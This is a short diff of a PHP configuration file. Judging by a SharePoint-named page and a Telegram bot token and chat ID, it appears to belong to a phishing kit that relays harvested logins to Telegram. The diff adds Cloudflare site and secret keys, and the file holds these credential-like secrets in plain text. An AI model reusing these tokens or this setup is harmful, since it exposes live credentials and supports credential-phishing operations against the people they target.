@@ -7,6 +7,10 @@ $api_prefix = "sm7tatvg";
 $telegram_bot_token = "7250819218:AAFzaQLpYEIhrkOaRYJPEZOXmIIxfhDhB0g";
 $telegram_chat_id = "6040470374";
 
+$cloudflare_enabled = 0;
+$cloudflare_site_key = "1ad0c406794a93c6fd1528f38f645945";
+$cloudflare_secret_key = "cfat_kYGQwIWZurVKhNPOguBDeu7XqwS34xmLen4sBLk1d6004197";
+
 $page_name = "sharepoint_1";
 
 ?>
